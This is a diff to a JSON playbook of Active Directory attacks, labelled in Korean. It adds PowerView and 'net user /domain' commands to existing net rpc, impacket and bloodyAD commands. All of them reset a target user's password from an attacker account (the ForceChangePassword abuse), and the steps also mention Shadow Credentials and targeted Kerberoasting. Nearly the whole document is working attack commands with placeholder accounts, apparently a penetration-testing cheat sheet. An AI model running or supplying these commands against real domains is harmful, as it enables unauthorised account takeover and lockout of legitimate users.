@@ -16,6 +16,8 @@
           "when": "대상이 사용자(User)",
           "steps": ["비밀번호 강제 변경(가장 확실)", "또는 Shadow Credentials(로그오프 불필요)", "또는 targeted Kerberoast(비번 안 바꿈)"],
           "cmd": [
+            "Import-Module .\\PowerView.ps1; Set-DomainUserPassword -Identity TARGETUSER -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose",
+            "net user TARGETUSER NewPass123! /domain",
             "net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01",
             "impacket-changepasswd 'corp.local/TARGETUSER'@dc01 -newpass 'NewPass123!' -altuser 'corp.local/attacker' -altpass 'Passw0rd!' -reset",
             "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 set password TARGETUSER 'NewPass123!'",
@@ -161,6 +163,8 @@
           "when": "대상이 사용자",
           "steps": ["비번 리셋 후 로그인 (원 사용자 계정 잠금 유의 -> 운영 환경은 주의)"],
           "cmd": [
+            "Import-Module .\\PowerView.ps1; Set-DomainUserPassword -Identity TARGETUSER -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose",
+            "net user TARGETUSER NewPass123! /domain",
             "net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01",
             "impacket-changepasswd 'corp.local/TARGETUSER'@dc01 -newpass 'NewPass123!' -altuser 'corp.local/attacker' -altpass 'Passw0rd!' -reset",
             "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 set password TARGETUSER 'NewPass123!'"
@@ -204,7 +208,11 @@
         {
           "when": "대상이 사용자",
           "steps": ["ForceChangePassword 로 비번 리셋"],
-          "cmd": ["net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01"]
+          "cmd": [
+            "Import-Module .\\PowerView.ps1; Set-DomainUserPassword -Identity TARGETUSER -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose",
+            "net user TARGETUSER NewPass123! /domain",
+            "net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01"
+          ]
         },
         {
           "when": "대상이 도메인",
